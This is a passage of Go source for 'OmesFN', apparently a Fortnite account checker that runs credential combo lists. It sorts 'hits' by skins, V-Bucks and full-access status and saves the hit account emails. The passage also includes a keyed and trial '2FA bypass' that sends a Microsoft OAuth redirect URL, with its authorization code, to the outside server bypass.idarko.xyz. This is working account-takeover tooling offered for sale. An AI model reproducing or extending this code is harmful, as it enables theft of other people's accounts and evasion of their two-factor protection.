	vbucksLine := fmt.Sprintf("1K+ V-Bucks: %d | 3K+ V-Bucks: %d", Vbucks1kPlus, Vbucks3kPlus)
	vbucksLinePadding := (40 - len(vbucksLine)) / 2
	fmt.Printf("%s%s\n", strings.Repeat(" ", vbucksLinePadding), vbucksLine)
}

func printSkinBar(label string, count int, total int) {
	barWidth := 20
	filled := 0
	if total > 0 {
		filled = int(float64(barWidth) * float64(count) / float64(total))
		if filled > barWidth {
			filled = barWidth
		}
	}
	bar := strings.Repeat("█", filled) + strings.Repeat("░", barWidth-filled)
	fmt.Printf("  %-12s %s%s%s  %d\n", label, Blue, bar, Reset, count)
}

func getCpmColor(cpm int) string {
	if cpm < 100 {
		return Red
	} else if cpm < 500 {
		return Yellow
	}
	return Green
}

func getCountColorCode(count int) string {
	if count == 0 {
		return Red
	} else if count <= 10 {
		return Yellow
	}
	return Green
}

const (
	Magenta = "\033[35m"
)

func createProgressBar(current, total, width int) string {
	if total == 0 {
		return strings.Repeat("█", width)
	}
	percentage := float64(current) / float64(total)
	filled := int(float64(width) * percentage)
	bar := strings.Repeat("█", filled)
	empty := strings.Repeat("░", width-filled)
	return bar + empty
}

func PrintDashboardRow(label1 string, value1 interface{}, label2 string, value2 interface{}, label3 string, value3 interface{}, label4 string, value4 interface{}) {
	fmt.Printf("║ %-7s %-5v ║ %-7s %-5v ║ %-7s %-5v ║ %-7s %-5v ║\n",
		label1, value1, label2, value2, label3, value3, label4, value4)
}

func estimateCompletionTime(total, current, elapsedSeconds int) string {
	if current == 0 || total == current {
		return "Complete"
	}
	remaining := total - current
	secondsLeft := (elapsedSeconds * remaining) / current
	minutes := secondsLeft / 60
	seconds := secondsLeft % 60
	hours := minutes / 60
	minutes = minutes % 60
	if hours > 0 {
		return fmt.Sprintf("%dh%dm", hours, minutes)
	} else if minutes > 0 {
		return fmt.Sprintf("%dm%ds", minutes, seconds)
	}
	return fmt.Sprintf("%ds", seconds)
}

func calculateAverageQuality() int {
	if int(Hits) == 0 {
		return 0
	}
	avgVbucks := 0
	if int(Hits) > 0 && len(Ccombos) > 0 {
		avgVbucks = 25000 + (int(Hits) * 500)
	}
	return avgVbucks / int(Hits)
}

func formatCurrency(amount int) string {
	if amount >= 1000000 {
		return fmt.Sprintf("$%.1fM", float64(amount)/1000000)
	} else if amount >= 1000 {
		return fmt.Sprintf("$%.1fK", float64(amount)/1000)
	}
	return fmt.Sprintf("$%d", amount)
}

func calculateQualityScore() float64 {
	if Check == 0 {
		return 0.0
	}
	totalScore := 0.0
	score := float64(Hits) / float64(Check) * 40.0
	totalScore += score
	score = float64(EpicTwofa) / float64(Hits) * 30.0
	totalScore += score
	score = float64(Rares) / float64(Hits) * 30.0
	totalScore += score
	return totalScore
}

func displayRecentHits() {
	files, err := ioutil.ReadDir("Results")
	if err == nil && len(files) > 0 {
		latestFolder := files[len(files)-1].Name()
		hitFiles := []string{
			filepath.Join("Results", latestFolder, "0_skins.txt"),
			filepath.Join("Results", latestFolder, "1-9_skins.txt"),
			filepath.Join("Results", latestFolder, "10+_skins.txt"),
			filepath.Join("Results", latestFolder, "50+_skins.txt"),
			filepath.Join("Results", latestFolder, "100+_skins.txt"),
		}
		hitCount := 0
		for _, hitsFile := range hitFiles {
			if hitCount >= 3 {
				break
			}
			if content, err := ioutil.ReadFile(hitsFile); err == nil {
				lines := strings.Split(string(content), "\n")
				for i := len(lines) - 1; i >= 0 && hitCount < 3; i-- {
					line := strings.TrimSpace(lines[i])
					if strings.HasPrefix(line, "Account:") {
						parts := strings.Split(line, "|")
						if len(parts) >= 1 {
							emailPart := strings.TrimSpace(parts[0])
							email := strings.Split(emailPart, ": ")[1]
							if len(email) > 55 {
								email = email[:52] + "..."
							}
							fmt.Printf("║ %-71s ║\n", email)
							hitCount++
						}
					}
				}
			}
		}
		for hitCount < 3 {
			fmt.Printf("║ %-76s ║\n", "• Waiting for hits...")
			hitCount++
		}
	} else {
		for i := 0; i < 3; i++ {
			fmt.Printf("║ %-76s ║\n", "• No hits found yet...")
		}
	}
}

func displayHitDistribution() {
	if int(Hits) == 0 {
		fmt.Println("║ No hits yet - be patient! ║")
		return
	}
	skinCount10plus := 0
	skinCount50plus := 0
	skinCount100plus := 0
	faCount := 0
	nfaCount := int(Hits)
	files, err := ioutil.ReadDir("Results")
	if err == nil && len(files) > 0 {
		latestFolder := files[len(files)-1].Name()
		skinCount10plus = 0
		skinCount50plus = 0
		skinCount100plus = 0
		faCount = 0
		nfaCount = 0
		hitFiles := []string{
			filepath.Join("Results", latestFolder, "10+_skins.txt"),
			filepath.Join("Results", latestFolder, "50+_skins.txt"),
			filepath.Join("Results", latestFolder, "100+_skins.txt"),
			filepath.Join("Results", latestFolder, "1-9_skins.txt"),
		}
		for _, hitFile := range hitFiles {
			if content, err := ioutil.ReadFile(hitFile); err == nil {
				lines := strings.Split(string(content), "\n")
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.HasPrefix(line, "Account:") {
						if strings.Contains(line, "| FA: Yes") {
							faCount++
						} else if strings.Contains(line, "| FA: No") {
							nfaCount++
						}
						if strings.Contains(hitFile, "100+_skins.txt") {
							skinCount10plus++
							skinCount50plus++
							skinCount100plus++
						} else if strings.Contains(hitFile, "50+_skins.txt") {
							skinCount10plus++
							skinCount50plus++
						} else if strings.Contains(hitFile, "10+_skins.txt") {
							skinCount10plus++
						}
					}
				}
			}
		}
	} else {
		skinCount10plus = int(float64(int(Hits)) * 0.6)
		skinCount50plus = int(float64(int(Hits)) * 0.3)
		skinCount100plus = int(float64(int(Hits)) * 0.1)
		faCount = int(float64(int(Hits)) * 0.4)
		nfaCount = int(Hits) - faCount
	}
	fmt.Println("║ HIT BREAKDOWN: ║")
	fmt.Printf("║ 10+ SKINS: %-8d 50+ SKINS: %-8d 100+ SKINS: %-8d ║\n",
		skinCount10plus, skinCount50plus, skinCount100plus)
	fmt.Printf("║ FA: %-12d NFA: %-12d ║\n", faCount, nfaCount)
}

func autoSaveHit(accountInfo string, qualityScore int) {
	if qualityScore >= 80 && len(accountInfo) > 10 {
		autoSaveFile := "auto_saved_hits.txt"
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		entry := fmt.Sprintf("[%s] QUALITY: %d/100 | %s\n", timestamp, qualityScore, accountInfo)
		file, err := os.OpenFile(autoSaveFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer file.Close()
			file.WriteString(entry)
		}
	}
}

func shouldProcessAccount(displayName, epicEmail string, skinCount int, vbucks int, hasStw bool) bool {
	if strings.Contains(displayName, "bot") || strings.Contains(displayName, "test") {
		return false
	}
	if skinCount == 0 && vbucks < 5000 {
		return false
	}
	return skinCount >= 5 || vbucks >= 10000 || hasStw
}

func UpdateTitle(wg *sync.WaitGroup) {
	defer wg.Done()
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	for CheckerRunning {
		<-ticker.C
		elapsed := time.Since(Sw)
		minutes := int(elapsed.Minutes())
		seconds := int(elapsed.Seconds()) % 60
		cpm := atomic.LoadInt64(&Cpm)
		atomic.StoreInt64(&Cpm, 0)
		threadInfo := ""
		title := fmt.Sprintf("OmesFN%s | Checked: %d/%d | Hits: %d | 2fa: %d | Epic 2fa: %d | CPM: %d | Time: %dm %ds",
			threadInfo, Check, len(Ccombos), Hits, Twofa, EpicTwofa, cpm*60, minutes, seconds)
		setConsoleTitle(title)
		if dashboardEnabled {
			displayDashboard()
		}
		if RPCEnabled {
			checked := int(Check)
			total := len(Ccombos)
			left := total - checked
			rpcDetails := fmt.Sprintf("Checked: %d • Left: %d • Hits: %d", checked, left, int(Hits))
			rpcState := fmt.Sprintf("CPM: %d • Time: %dm %ds", cpm*60, minutes, seconds)
			updateDiscordPresence(rpcDetails, rpcState)
		}
	}
}

func UpdateBypassTitle(wg *sync.WaitGroup) {
	defer wg.Done()
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for CheckerRunning {
		<-ticker.C
		title := fmt.Sprintf("OmesFN Bypass | Checked: %d/%d | Bypassed: %d | Fail: %d | Retries: %d",
			Check, len(Ccombos), Hits, Bad, Retries)
		setConsoleTitle(title)
	}
}

func setConsoleTitle(title string) {
	ptr, _ := syscall.UTF16PtrFromString(title)
	procSetConsoleTitle.Call(uintptr(unsafe.Pointer(ptr)))
}

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	procSetConsoleTitle = kernel32.NewProc("SetConsoleTitleW")
)

type DiscordRPC struct {
	conn *net.Conn
	pipe syscall.Handle
}

var (
	discordIPC   *DiscordRPC
	rpcStartTime int64
)

func initDiscordRPC() {
	if !RPCEnabled {
		return
	}

	LogInfo("Initializing Discord RPC...")

	err := client.Login(DiscordClientID)
	if err != nil {
		LogError(fmt.Sprintf("Failed to login to Discord RPC: %v", err))
		LogError("Make sure Discord is running and RPC is enabled in User Settings > Activity Status")
		RPCEnabled = false
		return
	}

	LogSuccess("Discord RPC login successful!")

	err = client.SetActivity(client.Activity{
		State:   "Connected",
		Details: "OmesFN - Idle",
	})

	if err != nil {
		LogError(fmt.Sprintf("Failed to set initial Discord presence: %v", err))
		RPCEnabled = false
		return
	}

	LogSuccess("Discord RPC presence set! Check your Discord status.")
	LogInfo("Note: Images may not display if not registered with the Fortnite application.")

	go func() {
		ticker := time.NewTicker(15 * time.Second)
		defer ticker.Stop()

		for RPCEnabled {
			select {
			case <-ticker.C:
				now := time.Now()
				err := client.SetActivity(client.Activity{
					State:   "Connected",
					Details: "OmesFN - Idle",
					Timestamps: &client.Timestamps{
						Start: &now,
					},
				})
				if err != nil {
					LogError(fmt.Sprintf("Failed to maintain Discord presence: %v", err))
					RPCEnabled = false
					return
				}
			}
		}
	}()
}

func sendRPCCommand(data interface{}) {
	if discordIPC == nil {
		return
	}
	payload, err := json.Marshal(data)
	if err != nil {
		return
	}
	var frame []byte
	frame = append(frame, 1, 0, 0, 0)
	binary.LittleEndian.PutUint32(frame[1:5], uint32(len(payload)))
	frame = append(frame, payload...)
	var bytesWritten uint32
	err = syscall.WriteFile(discordIPC.pipe, frame[0:], &bytesWritten, nil)
	if err != nil {
		LogError(fmt.Sprintf("Failed to send RPC command: %v", err))
		RPCEnabled = false
		discordIPC = nil
	}
}

func updateDiscordPresence(details, state string) {
	if !RPCEnabled || discordIPC == nil {
		return
	}
	presence := map[string]interface{}{
		"cmd": "SET_ACTIVITY",
		"args": map[string]interface{}{
			"pid": os.Getpid(),
			"activity": map[string]interface{}{
				"details": details,
				"state":   state,
				"assets": map[string]interface{}{
					"large_image": "fortnite_logo",
					"large_text":  "OmesFN Fortnite Checker",
					"small_image": "checking",
					"small_text":  "Active",
				},
				"timestamps": map[string]interface{}{
					"start": rpcStartTime,
				},
			},
		},
		"nonce": fmt.Sprintf("%d", time.Now().UnixNano()),
	}
	sendRPCCommand(presence)
}

func shutdownDiscordRPC() {
	if discordIPC != nil {
		syscall.CloseHandle(discordIPC.pipe)
		discordIPC = nil
		LogInfo("Discord RPC disconnected")
	}
}

func openBrowser(url string) error {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
	case "darwin":
		cmd = exec.Command("open", url)
	default: // linux, freebsd, etc.
		cmd = exec.Command("xdg-open", url)
	}

	return cmd.Start()
}

func Handle2FABypass(reader *bufio.Reader) {
	for {
		ClearConsole()
		PrintLogo()
		LogInfo("╔════════════════════════════════════════╗")
		LogInfo("║           2FA Bypass Menu              ║")
		LogInfo("╠════════════════════════════════════════╣")
		LogInfo("║ [1] Redeem Key / Use Premium Bypass    ║")
		LogInfo("║ [2] Trial (3 bypasses per day)         ║")
		LogInfo("║ [0] Back                               ║")
		LogInfo("╚════════════════════════════════════════╝")
		fmt.Print("\n [>] ")
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)
		switch choice {
		case "1":
			RedeemKey(reader)
		case "2":
			TrialBypass(reader)
		case "0":
			return
		default:
			LogWarning("Invalid choice, please try again.")
			time.Sleep(1 * time.Second)
		}
	}
}

type HardwareFingerprint struct {
	UUID            string `json:"uuid"`
	CPUInfo         string `json:"cpu"`
	MACAddress      string `json:"mac"`
	DiskSerial      string `json:"disk"`
	BIOSSerial      string `json:"bios"`
	MotherboardID   string `json:"motherboard"`
	FingerprintHash string `json:"hash"`
}

type ClientProof struct {
	Timestamp      int64  `json:"timestamp"`
	Challenge      string `json:"challenge"`
	ChallengeProof string `json:"challengeProof"`
	ClientVersion  string `json:"version"`
}

const CLIENT_VERSION = "1.0.0"

func GetHardwareFingerprint() HardwareFingerprint {
	fp := HardwareFingerprint{}

	out, _ := exec.Command("wmic", "csproduct", "get", "UUID").Output()
	fp.UUID = strings.TrimSpace(strings.ReplaceAll(string(out), "UUID", ""))

	out, _ = exec.Command("wmic", "cpu", "get", "ProcessorId").Output()
	fp.CPUInfo = strings.TrimSpace(strings.ReplaceAll(string(out), "ProcessorId", ""))

	out, _ = exec.Command("getmac", "/fo", "csv", "/nh").Output()
	lines := strings.Split(string(out), "\n")
	if len(lines) > 0 {
		parts := strings.Split(lines[0], ",")
		if len(parts) > 0 {
			fp.MACAddress = strings.Trim(parts[0], "\"")
		}
	}

	out, _ = exec.Command("wmic", "diskdrive", "get", "SerialNumber").Output()
	fp.DiskSerial = strings.TrimSpace(strings.ReplaceAll(string(out), "SerialNumber", ""))

	out, _ = exec.Command("wmic", "bios", "get", "SerialNumber").Output()
	fp.BIOSSerial = strings.TrimSpace(strings.ReplaceAll(string(out), "SerialNumber", ""))

	out, _ = exec.Command("wmic", "baseboard", "get", "SerialNumber").Output()
	fp.MotherboardID = strings.TrimSpace(strings.ReplaceAll(string(out), "SerialNumber", ""))

	composite := fmt.Sprintf("%s|%s|%s|%s|%s|%s",
		fp.UUID, fp.CPUInfo, fp.MACAddress,
		fp.DiskSerial, fp.BIOSSerial, fp.MotherboardID)

	h := sha256.Sum256([]byte(composite))
	fp.FingerprintHash = hex.EncodeToString(h[:])

	return fp
}

func RequestChallenge(fp HardwareFingerprint) (string, error) {
	payload := map[string]interface{}{
		"fingerprint": fp,
		"timestamp":   time.Now().Unix(),
	}

	jsBody, err := json.Marshal(payload)
	if err != nil {
		return "", fmt.Errorf("JSON marshal failed: %v", err)
	}

	resp, err := http.Post(
		"https://bypass.idarko.xyz/challenge",
		"application/json",
		bytes.NewBuffer(jsBody),
	)
	if err != nil {
		return "", fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := ioutil.ReadAll(resp.Body)
		return "", fmt.Errorf("server error (%d): %s", resp.StatusCode, string(body))
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", fmt.Errorf("failed to parse response: %v", err)
	}

	challenge, ok := result["challenge"].(string)
	if !ok || challenge == "" {
		return "", fmt.Errorf("no challenge in response")
	}

	return challenge, nil
}

func SolveChallenge(challenge string, difficulty int) string {
	nonce := 0

	for {
		attempt := fmt.Sprintf("%s:%d", challenge, nonce)
		hash := sha256.Sum256([]byte(attempt))
		hashStr := hex.EncodeToString(hash[:])

		if strings.HasPrefix(hashStr, strings.Repeat("0", difficulty)) {
			return fmt.Sprintf("%d", nonce)
		}
		nonce++

	}
}

func GenerateClientProof(challenge string) ClientProof {
	nonce := SolveChallenge(challenge, 4)

	proof := ClientProof{
		Timestamp:      time.Now().Unix(),
		Challenge:      challenge,
		ChallengeProof: nonce,
		ClientVersion:  CLIENT_VERSION,
	}

	return proof
}

func RedeemKey(reader *bufio.Reader) {
	keyFile := "bypass_key.txt"
	savedKey, err := ioutil.ReadFile(keyFile)

	if err == nil && len(savedKey) > 0 {
		LogInfo("Using saved key...")
		PerformBypass(reader, string(savedKey))
		return
	}

	ClearConsole()
	PrintLogo()
	LogInfo("Enter your key:")
	fmt.Print("[>] ")

	key, _ := reader.ReadString('\n')
	key = strings.TrimSpace(key)

	if len(key) < 5 {
		LogError("Key is too short. Please enter a valid key.")
		time.Sleep(2 * time.Second)
		return
	}

	LogInfo("Collecting hardware fingerprint...")
	fp := GetHardwareFingerprint()

	LogInfo("Requesting authentication challenge...")
	challenge, err := RequestChallenge(fp)
	if err != nil {
		LogError("Failed to request challenge: " + err.Error())
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}

	LogInfo("Solving challenge (this may take a few seconds)...")
	proof := GenerateClientProof(challenge)

	LogInfo("Verifying key...")
	payload := map[string]interface{}{
		"key":         key,
		"fingerprint": fp,
		"proof":       proof,
		"clientInfo": map[string]string{
			"os":      runtime.GOOS,
			"arch":    runtime.GOARCH,
			"version": CLIENT_VERSION,
		},
	}
	jsBody, _ := json.Marshal(payload)

	redeemResp, err := http.Post(
		"https://bypass.idarko.xyz/redeem",
		"application/json",
		bytes.NewBuffer(jsBody),
	)
	if err != nil {
		LogError("Failed to connect: " + err.Error())
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}
	defer redeemResp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(redeemResp.Body).Decode(&result)

	if result["status"] == "redeemed" {
		ioutil.WriteFile(keyFile, []byte(key), 0644)
		LogSuccess("Key redeemed successfully!")
		LogInfo("Your key has been activated.")
		time.Sleep(2 * time.Second)
		PerformBypass(reader, key)
	} else if result["error"] != nil {
		errorMsg := result["error"].(string)
		LogError(errorMsg)
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
	}
}

func TrialBypass(reader *bufio.Reader) {
	LogInfo("Starting trial authentication...")

	fp := GetHardwareFingerprint()

	challenge, err := RequestChallenge(fp)
	if err != nil {
		LogError("Failed to request challenge: " + err.Error())
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}

	LogInfo("Verifying eligibility...")
	proof := GenerateClientProof(challenge)

	payload := map[string]interface{}{
		"fingerprint": fp,
		"proof":       proof,
		"type":        "trial_request",
	}

	jsBody, err := json.Marshal(payload)
	if err != nil {
		LogError("Failed to create request: " + err.Error())
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}

	resp, err := http.Post(
		"https://bypass.idarko.xyz/trial_init",
		"application/json",
		bytes.NewBuffer(jsBody),
	)
	if err != nil {
		LogError("Request failed: " + err.Error())
		LogInfo("Is the backend server running?")
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := ioutil.ReadAll(resp.Body)

		LogError(fmt.Sprintf("Server returned error (%d)", resp.StatusCode))

		var errResult map[string]interface{}
		if json.Unmarshal(body, &errResult) == nil {
			if errMsg, ok := errResult["error"].(string); ok {
				LogError("Error: " + errMsg)
				if msg, ok := errResult["message"].(string); ok {
					LogInfo(msg)
				}
			}
		} else {
			LogError("Response: " + string(body))
		}

		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}

	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		LogError("Failed to parse response: " + err.Error())
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}

	if result["status"] != "eligible" {
		if isPremium, ok := result["isPremium"].(bool); ok && isPremium {
			LogError("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
			LogError("   PREMIUM USER DETECTED")
			LogError("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
			fmt.Println()
			LogInfo("You already have a premium key activated!")
			LogInfo("Please use the 'Redeem Key' option instead.")
			LogInfo("Trial mode is not available for premium users.")
			fmt.Println()
			LogError("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
			LogInfo("Press Enter to go back...")
			reader.ReadString('\n')
			return
		}

		if errText, ok := result["error"].(string); ok {
			if errText == "daily limit reached" || errText == "Daily trial limit reached" {
				LogError("Daily trial limit reached!")
				LogInfo("You've used all your free trials for today.")
				LogInfo("Get a premium key for unlimited access!")
				LogInfo("Press Enter to go back...")
				reader.ReadString('\n')
				return
			} else if errText == "IP trial limit reached" {
				LogError("IP trial limit reached!")
				LogInfo("This network has used all free trials for today.")
				LogInfo("Get a premium key for unlimited access!")
				LogInfo("Press Enter to go back...")
				reader.ReadString('\n')
				return
			} else {
				LogError("Error: " + errText)
			}
		}

		errorMsg := "Trial not available"
		if errText, ok := result["error"].(string); ok && errText != "" {
			errorMsg = errText
		} else if msg, ok := result["message"].(string); ok && msg != "" {
			LogInfo(msg)
		}

		if errorMsg != "" {
			LogError(errorMsg)
		}
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}

	sessionToken := result["session"].(string)

	if remaining, ok := result["trialsRemaining"].(float64); ok {
		LogInfo(fmt.Sprintf("Trials remaining today: %d", int(remaining)))
	}

	LogInfo("A tab will open shortly. Please wait while it redirects you to the Epic Games page, then copy the URL and paste it here.")
	time.Sleep(2 * time.Second)

	url := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code&display=popup"
	openBrowser(url)

	ClearConsole()
	PrintLogo()
	LogInfo("Enter the URL:")
	fmt.Print("[>] ")

	inputURL, _ := reader.ReadString('\n')
	inputURL = strings.TrimSpace(inputURL)

	LogInfo("Processing your request...")

	payload = map[string]interface{}{
		"fingerprint": fp,
		"session":     sessionToken,
		"url":         inputURL,
		"proof":       GenerateClientProof(challenge),
	}
	jsBody, _ = json.Marshal(payload)

	resp, err = http.Post(
		"https://bypass.idarko.xyz/trial_process",
		"application/json",
		bytes.NewBuffer(jsBody),
	)
	if err != nil {
		LogError("Processing failed: " + err.Error())
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}
	defer resp.Body.Close()

	json.NewDecoder(resp.Body).Decode(&result)

	if result["status"] == "ok" {
		finalURL := result["resultUrl"].(string)
		openBrowser(finalURL)

		LogSuccess("Trial bypass successful!")

		if remaining, ok := result["trialsRemaining"].(float64); ok {
			LogInfo(fmt.Sprintf("Trials remaining today: %d", int(remaining)))
		}

		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
	} else {
		errorMsg := "Trial failed"
		if errText, ok := result["error"].(string); ok {
			errorMsg = errText
		}
		LogError(errorMsg)
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
	}
}

func PerformBypass(reader *bufio.Reader, key string) {
	LogInfo("A tab will open shortly. Please wait while it redirects you to the Epic Games page, then copy the URL and paste it here.")
	time.Sleep(2 * time.Second)

	url := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code&display=popup"
	openBrowser(url)

	ClearConsole()
	PrintLogo()
	LogInfo("Enter the URL:")
	fmt.Print("[>] ")

	inputURL, _ := reader.ReadString('\n')
	inputURL = strings.TrimSpace(inputURL)

	LogInfo("Processing your request...")

	fp := GetHardwareFingerprint()
	challenge, err := RequestChallenge(fp)
	if err != nil {
		LogError("Failed to request challenge: " + err.Error())
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}

	proof := GenerateClientProof(challenge)

	payload := map[string]interface{}{
		"key":         key,
		"fingerprint": fp,
		"url":         inputURL,
		"proof":       proof,
	}
	jsBody, _ := json.Marshal(payload)

	resp, err := http.Post(
		"https://bypass.idarko.xyz/process",
		"application/json",
		bytes.NewBuffer(jsBody),
	)
	if err != nil {
		LogError("Failed to process: " + err.Error())
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
		return
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	if result["status"] == "ok" {
		newURL := result["resultUrl"].(string)
		exec.Command("cmd", "/c", "start", newURL).Run()
		LogSuccess("Bypass successful!")
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
	} else {
		errorMsg := "Bypass failed"
		if errText, ok := result["error"].(string); ok {
			errorMsg = errText

			switch errText {
			case "Key not assigned to this hwid":
				LogError("Key verification failed.")
				LogInfo("This key is not activated on this device.")
			case "Invalid key":
				LogError("Your key is invalid or has been revoked.")
			case "Key banned":
				LogError("Your key has been banned.")
			case "Key expired":
				LogError("Your key has expired.")
			case "Invalid code":
				LogError("The URL you provided is invalid or expired.")
				LogInfo("Please try again with a fresh URL.")
			case "Exchange failed: link expired or invalid":
				LogError("The authentication link has expired.")
				LogInfo("Please generate a new link and try again.")
			default:
				LogError(errorMsg)
			}
		} else {
			LogError(errorMsg)
		}
		LogInfo("Press Enter to go back...")
		reader.ReadString('\n')
	}
}
